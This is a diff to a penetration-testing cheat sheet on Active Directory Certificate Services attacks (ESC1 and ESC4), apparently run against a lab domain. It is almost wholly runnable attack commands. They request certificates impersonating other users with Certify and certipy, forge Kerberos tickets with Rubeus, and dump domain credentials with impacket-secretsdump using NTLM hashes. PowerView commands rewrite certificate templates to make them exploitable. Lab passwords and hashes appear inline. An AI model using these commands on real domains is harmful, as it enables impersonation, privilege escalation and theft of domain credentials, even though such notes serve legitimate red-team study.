@@ -1,5 +1,7 @@
-# ESC*
+# ADCS
+
 ## ESC1
+
 ```bash
 # enumerate existing templates
 certipy-ad find -scheme ldap -u TestAlpha@contoso.org -p 'win10-gui-P@$swd' -dc-ip 192.168.68.64 -stdout -vulnerable -enabled
@@ -85,5 +87,47 @@ impacket-secretsdump -outputfile contoso.org.dump -k WIN-KML6TP4LOOL.contoso.org
 
 # we can also perform secretsdump using just hashes (NOTE THE '$' SIGN AFTER COMPUTERNAME !!!!)
 impacket-secretsdump -outputfile contoso.dump -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 'CONTOSO.ORG/WIN-NUU0DPB1BVC$@192.168.68.64'
+
+
+##############
+### !!UT!! ###
+##############
+# scan ADCS for vulnerable templates
+Certify.exe find /vulnerable
+
+# request a certificate specifying an "alternative name"
+Certify.exe request /ca:ca.domain.local\ca /template:VulnTemplate /altname:TargetUser
+
+# convert a certificate from .pem to .pfx
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# request a TGT for the user using Rubeus
+Rubeus.exe asktgt /user:TargetUser /certificate:C:\Temp\cert.pfx
+
+# remember: one session can only contain one TGT - you can use "runas /netonly"
 ```
 
+## ESC4
+
+```bash
+### CERTIPY
+# PAY ATTENTION TO "Write Owner Principals", "Write Dacl Principals", "Write Property Principals"
+certipy-ad find -scheme ldap -u Administrator@contoso.org -p 'win2016-cli-P@$swd' -dc-ip 192.168.68.64 -stdout
+
+### BLOODHOUND
+rusthound -d contoso.org -u 'TestAlpha@contoso.org' -p 'win10-gui-P@$swd' -o /tmp/rusthound.txt -z
+```
+
+```bash
+#################
+### POWERVIEW ###
+#################
+# CHECK: Retrieve all certificate templates and their ACEs
+Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+# if the commands retrieve ActiveDirectoryRights: WriteProperty to a template - you can edit it to your needs
+
+# EDIT TEMPLATE: if you are able to edit the certificate template you can edit it so it will become vulnerable to ESC1
+# in order to do it you need change the value of mspki-certificate-name-flag attribute to "1" and add "Client Authentication (1.3.6.1.5.5.7.3.2)" to pkiextendedkeyusage or/and mspki-certificate-application-policy
+Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -XOR @{'mspki-certificate-name-flag' = '1'}
+Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Set @{'mspki-certificate-application-policy' = '1.3.6.1.5.5.7.3.2', '1.3.6.1.5.5.7.3.4', '1.3.6.1.4.1.311.10.3.4'}
+```
